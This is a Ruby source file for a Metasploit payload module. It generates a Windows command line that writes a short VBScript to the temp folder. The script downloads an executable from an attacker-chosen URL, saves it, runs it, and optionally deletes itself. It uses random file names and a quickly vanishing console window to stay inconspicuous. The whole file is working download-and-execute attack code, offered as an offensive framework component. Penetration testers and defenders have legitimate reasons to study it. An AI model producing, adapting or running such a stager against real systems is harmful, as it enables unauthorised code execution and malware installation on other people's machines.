##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows Executable Download and Execute (via .vbs)',
      'Description' => 'Download an EXE from an HTTP(S) URL and execute it',
      'Author'      => 'scriptjunkie',
      'License'     => BSD_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::None,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'wscript',
      'Payload'     =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))

    register_options(
      [
        OptString.new('URL', [ true, "The pre-encoded URL to the executable" ]),
        OptString.new('EXT', [ true, "The extension to give the saved file", "exe" ]),
        OptBool.new('INCLUDECMD', [ true, "Include the cmd /q /c", false ]),
        OptBool.new('DELETE', [ true, "Delete created .vbs after download", true ])
      ])
  end

  def generate
    return super + command_string
  end

  def command_string
    # It's already long. Keep variable names short.
    vbsname = Rex::Text.rand_text_alpha(1+rand(2))
    exename = Rex::Text.rand_text_alpha(1+rand(2))
    xmlhttpvar = Rex::Text.rand_text_alpha(1+rand(2))
    streamvar = Rex::Text.rand_text_alpha(1+rand(2))

    command = ''
    command << "cmd.exe /q /c " if datastore['INCLUDECMD']
    # "start #{vbsname}.vbs" instead of just "#{vbsname}.vbs" so that the console window
    # disappears quickly before the wscript libraries load and the file downloads
    command << "cd %tmp%&echo Set #{xmlhttpvar}=CreateObject(\"Microsoft.XMLHTTP\"):"+
      "#{xmlhttpvar}.Open \"GET\",\"#{datastore['URL']}\",False:"+
      "#{xmlhttpvar}.Send:"+
      "Set #{streamvar}=CreateObject(\"ADODB.Stream\"):"+
      "#{streamvar}.Type=1:"+
      "#{streamvar}.Open:"+
      "#{streamvar}.Write #{xmlhttpvar}.responseBody:"+
      "#{streamvar}.SaveToFile \"#{exename}.#{datastore['EXT']}\",2:"+
      "CreateObject(\"WScript.Shell\").Run \"#{exename}.#{datastore['EXT']}\":"
    command << "CreateObject(\"Scripting.FileSystemObject\").DeleteFile \"#{vbsname}.vbs\"" if datastore['DELETE']
    command << " >#{vbsname}.vbs"+
      "&start wscript #{vbsname}.vbs"
  end
end
